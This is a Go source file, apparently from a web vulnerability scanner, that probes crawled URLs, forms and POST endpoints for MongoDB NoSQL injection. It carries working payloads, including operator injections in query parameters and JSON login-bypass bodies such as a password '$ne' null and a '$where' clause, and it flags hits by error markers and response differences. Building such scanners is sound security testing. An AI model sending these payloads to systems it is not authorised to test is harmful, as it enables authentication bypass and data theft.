package modules

import (
	"bytes"
	"fmt"
	"github.com/SentinelXofficial/sxel/internal/output"
	"github.com/SentinelXofficial/sxel/pkg/core"
	"net/http"
	"net/url"
	"strings"
	"time"
)

// nosqlURLOperator holds the URL-encoded form of a MongoDB operator and the
// baseline operator for comparison requests.
type nosqlURLOperator struct {
	TrueParam  string // e.g. "[$gt]" → injected as param[$gt]=
	TrueValue  string
	FalseParam string
	FalseValue string
	Label      string
}

// MongoDB operator injections via URL query params.
// True condition: should return MORE data (or 200).
// False condition: should return LESS data (or 401/403).
var nosqlURLOps = []nosqlURLOperator{
	{"[$ne]", "xxxxxxx-impossible", "[$ne]", "", "$ne operator (not-equal bypass)"},
	{"[$gt]", "", "[$lt]", "zzzzz", "$gt vs $lt operator"},
	{"[$regex]", ".*", "[$regex]", "^IMPOSSIBLEPATTERN12345$", "$regex .* vs no-match"},
	{"[$exists]", "true", "[$exists]", "false", "$exists true vs false"},
	{"[$in][]", "a", "[$nin][]", "a", "$in vs $nin array"},
}

// nosqlJSONPayload is a JSON body to send to POST endpoints for NoSQL injection.
type nosqlJSONPayload struct {
	Label     string
	TrueBody  string // body that should bypass auth / return data
	FalseBody string // control body that should NOT bypass
}

// These payloads target common authentication bypass patterns.
var nosqlJSONPayloads = []nosqlJSONPayload{
	{
		Label:     "Auth bypass: password $ne null",
		TrueBody:  `{"username":"admin","password":{"$ne":null}}`,
		FalseBody: `{"username":"admin","password":"INVALID_PASSWORD_XYZ123"}`,
	},
	{
		Label:     "Auth bypass: password $gt empty",
		TrueBody:  `{"username":"admin","password":{"$gt":""}}`,
		FalseBody: `{"username":"admin","password":{"$lt":"AAAAA"}}`,
	},
	{
		Label:     "Auth bypass: username $ne null",
		TrueBody:  `{"username":{"$ne":null},"password":{"$ne":null}}`,
		FalseBody: `{"username":"INVALID_USER_XYZ","password":"INVALID_PASS_XYZ"}`,
	},
	{
		Label:     "Auth bypass: username $regex .*",
		TrueBody:  `{"username":{"$regex":".*"},"password":{"$ne":null}}`,
		FalseBody: `{"username":"INVALID_USER_XYZ","password":"INVALID_PASS_XYZ"}`,
	},
	{
		Label:     "Auth bypass: $where true",
		TrueBody:  `{"$where":"1==1"}`,
		FalseBody: `{"$where":"1==2"}`,
	},
}

// nosqlErrorMarkers appear in responses when a MongoDB query fails due to
// operator injection triggering a server-side error.
var nosqlErrorMarkers = []string{
	"cannot use $",
	"unknown operator",
	"bad argument",
	"invalid operator",
	"dollar sign",
	"mongoerror",
	"mongoresult",
	"bsontype",
	"objectid",
	"bulkwriteerror",
	"writeconflict",
	"e11000 duplicate key",
	"assert failed",
	"mongosh",
}

// doJSONPOST sends a raw JSON body to rawURL.
func doJSONPOST(client *http.Client, cfg *core.Config, rawURL, jsonBody string) (string, int, error) {
	cfg.Limiter.Wait()
	req, err := http.NewRequest("POST", rawURL, bytes.NewBufferString(jsonBody))
	if err != nil {
		return "", 0, err
	}
	core.ApplyHeaders(req, cfg)
	req.Header.Set("Content-Type", "application/json")
	resp, err := client.Do(req)
	if err != nil {
		return "", 0, err
	}
	defer resp.Body.Close()
	b := core.ReadBody(resp.Body)
	return b, resp.StatusCode, nil
}

// ScanNoSQLi tests for NoSQL injection vulnerabilities via:
//  1. URL param operator injection (GET)
//  2. JSON body auth-bypass payloads (POST)
//  3. Error-based detection (MongoDB error strings in response)
func ScanNoSQLi(client *http.Client, cfg *core.Config, target core.CrawlResult) []core.ScanResult {
	var results []core.ScanResult

	// ── URL parameters — operator injection ───────────────────────────────
	var params url.Values
	p, err := url.Parse(target.URL)
	if err == nil {
		params, _ = url.ParseQuery(p.RawQuery)
	} else {
		params = url.Values{}
	}

	for param := range params {
		if cfg.Verbose {
			output.Verbose("[nosql-get] param=%s", param)
		}

	NoSQLURLLoop:
		for _, op := range nosqlURLOps {
			// Build "true" URL: param[$ne]=xxxxxxx-impossible
			trueURL, err := buildNoSQLURL(target.URL, param, op.TrueParam, op.TrueValue)
			if err != nil {
				continue
			}
			// Build "false" URL: param[$lt]=zzzzz
			falseURL, err := buildNoSQLURL(target.URL, param, op.FalseParam, op.FalseValue)
			if err != nil {
				continue
			}

			trueBody, trueStatus, err := core.DoGET(client, cfg, trueURL)
			if err != nil {
				continue
			}
			falseBody, falseStatus, err := core.DoGET(client, cfg, falseURL)
			if err != nil {
				continue
			}

			// Error-based: MongoDB errors in response
			trueBodyLow := strings.ToLower(trueBody)
			for _, marker := range nosqlErrorMarkers {
				if strings.Contains(trueBodyLow, marker) {
					results = append(results, core.ScanResult{
						Type: "NoSQL Injection (Error-Based)",
						URL:  trueURL, Method: "GET", Parameter: param,
						Payload: op.Label, Severity: "HIGH",
						Evidence:  fmt.Sprintf("MongoDB error marker %q in response (HTTP %d)", marker, trueStatus),
						Timestamp: time.Now(),
					})
					break NoSQLURLLoop
				}
			}

			// Boolean-based: significant difference between true and false conditions
			lenDiff := len(trueBody) - len(falseBody)
			if lenDiff < 0 {
				lenDiff = -lenDiff
			}
			statusDiff := trueStatus != falseStatus

			// A >150 byte diff or status change between operator variants = likely injection
			if lenDiff > 150 || statusDiff {
				payload := fmt.Sprintf("TRUE: %s%s=%s | FALSE: %s%s=%s",
					param, op.TrueParam, op.TrueValue, param, op.FalseParam, op.FalseValue)
				results = append(results, core.ScanResult{
					Type: "NoSQL Injection (Boolean-Based)",
					URL:  trueURL, Method: "GET", Parameter: param,
					Payload: payload, Severity: "HIGH",
					Evidence:  fmt.Sprintf("response diff: %d bytes (status %d vs %d) [%s]", lenDiff, trueStatus, falseStatus, op.Label),
					Timestamp: time.Now(),
				})
				break NoSQLURLLoop
			}
		}
	}

	// ── Forms ─────────────────────────────────────────────────────────────
	// URL-param operator injection via GET forms
	for _, form := range target.Forms {
		if strings.ToUpper(form.Method) == "GET" {
			for _, inp := range form.Inputs {
				if cfg.Verbose {
					output.Verbose("[nosql-form-get] %s input=%s", form.Action, inp.Name)
				}

			NoSQLGetFormLoop:
				for _, op := range nosqlURLOps {
					trueURL, err := buildNoSQLURL(form.Action, inp.Name, op.TrueParam, op.TrueValue)
					if err != nil {
						continue
					}
					falseURL, err := buildNoSQLURL(form.Action, inp.Name, op.FalseParam, op.FalseValue)
					if err != nil {
						continue
					}

					trueBody, trueStatus, err := core.DoGET(client, cfg, trueURL)
					if err != nil {
						continue
					}
					falseBody, falseStatus, err := core.DoGET(client, cfg, falseURL)
					if err != nil {
						continue
					}

					trueBodyLow := strings.ToLower(trueBody)
					for _, marker := range nosqlErrorMarkers {
						if strings.Contains(trueBodyLow, marker) {
							results = append(results, core.ScanResult{
								Type: "NoSQL Injection via core.Form (Error-Based)",
								URL:  form.Action, Method: "GET", Parameter: inp.Name,
								Payload: op.Label, Severity: "HIGH",
								Evidence:  fmt.Sprintf("MongoDB error %q in response (HTTP %d)", marker, trueStatus),
								Timestamp: time.Now(),
							})
							break NoSQLGetFormLoop
						}
					}

					lenDiff := len(trueBody) - len(falseBody)
					if lenDiff < 0 {
						lenDiff = -lenDiff
					}
					if lenDiff > 150 || trueStatus != falseStatus {
						results = append(results, core.ScanResult{
							Type: "NoSQL Injection via core.Form (Boolean-Based)",
							URL:  form.Action, Method: "GET", Parameter: inp.Name,
							Payload: op.Label, Severity: "HIGH",
							Evidence:  fmt.Sprintf("diff: %d bytes (status %d vs %d)", lenDiff, falseStatus, trueStatus),
							Timestamp: time.Now(),
						})
						break NoSQLGetFormLoop
					}
				}
			}
		}
	}

	// ── JSON POST endpoints ────────────────────────────────────────────────
	// Try JSON auth-bypass payloads on all POST form actions and the base URL.
	postEndpoints := map[string]bool{target.URL: true}
	for _, form := range target.Forms {
		if strings.ToUpper(form.Method) == "POST" && form.Action != "" {
			postEndpoints[form.Action] = true
		}
	}

	for endpoint := range postEndpoints {
		if cfg.Verbose {
			output.Verbose("[nosql-json-post] %s", endpoint)
		}

	NoSQLJSONLoop:
		for _, pl := range nosqlJSONPayloads {
			trueBody, trueStatus, err := doJSONPOST(client, cfg, endpoint, pl.TrueBody)
			if err != nil {
				continue
			}
			// Skip endpoints that don't accept JSON (non-200-range baseline)
			if trueStatus == 404 || trueStatus == 405 || trueStatus == 415 {
				continue
			}

			falseBody, falseStatus, err := doJSONPOST(client, cfg, endpoint, pl.FalseBody)
			if err != nil {
				continue
			}

			// Error-based
			trueBodyLow := strings.ToLower(trueBody)
			for _, marker := range nosqlErrorMarkers {
				if strings.Contains(trueBodyLow, marker) {
					results = append(results, core.ScanResult{
						Type: "NoSQL Injection (JSON POST — Error-Based)",
						URL:  endpoint, Method: "POST", Parameter: "body",
						Payload: pl.TrueBody, Severity: "HIGH",
						Evidence:  fmt.Sprintf("MongoDB error %q in response (HTTP %d)", marker, trueStatus),
						Timestamp: time.Now(),
					})
					break NoSQLJSONLoop
				}
			}

			// Auth-bypass: true condition gives 200/success, false gives 401/403/different
			if (trueStatus == 200 || trueStatus == 201 || trueStatus == 302) &&
				(falseStatus == 401 || falseStatus == 403 || falseStatus == 422) {
				results = append(results, core.ScanResult{
					Type: "NoSQL Injection (JSON Auth Bypass)",
					URL:  endpoint, Method: "POST", Parameter: "body",
					Payload: pl.TrueBody, Severity: "CRITICAL",
					Evidence:  fmt.Sprintf("auth bypass: true=%d, false=%d [%s]", trueStatus, falseStatus, pl.Label),
					Timestamp: time.Now(),
				})
				break NoSQLJSONLoop
			}

			// Length-based boolean comparison
			lenDiff := len(trueBody) - len(falseBody)
			if lenDiff < 0 {
				lenDiff = -lenDiff
			}
			if lenDiff > 200 && trueStatus == falseStatus {
				results = append(results, core.ScanResult{
					Type: "NoSQL Injection (JSON POST — Boolean-Based)",
					URL:  endpoint, Method: "POST", Parameter: "body",
					Payload: pl.TrueBody, Severity: "HIGH",
					Evidence:  fmt.Sprintf("response diff: %d bytes (both HTTP %d) [%s]", lenDiff, trueStatus, pl.Label),
					Timestamp: time.Now(),
				})
				break NoSQLJSONLoop
			}
		}
	}

	return results
}

// buildNoSQLURL constructs a URL with a MongoDB operator injected into
// a query parameter. e.g. ?param[$ne]=value
func buildNoSQLURL(rawURL, param, opSuffix, value string) (string, error) {
	p, err := url.Parse(rawURL)
	if err != nil {
		return "", err
	}
	q, err := url.ParseQuery(p.RawQuery)
	if err != nil {
		return "", err
	}
	// Remove the original scalar param and add the operator variant
	delete(q, param)
	q.Set(param+opSuffix, value)
	p.RawQuery = q.Encode()
	return p.String(), nil
}
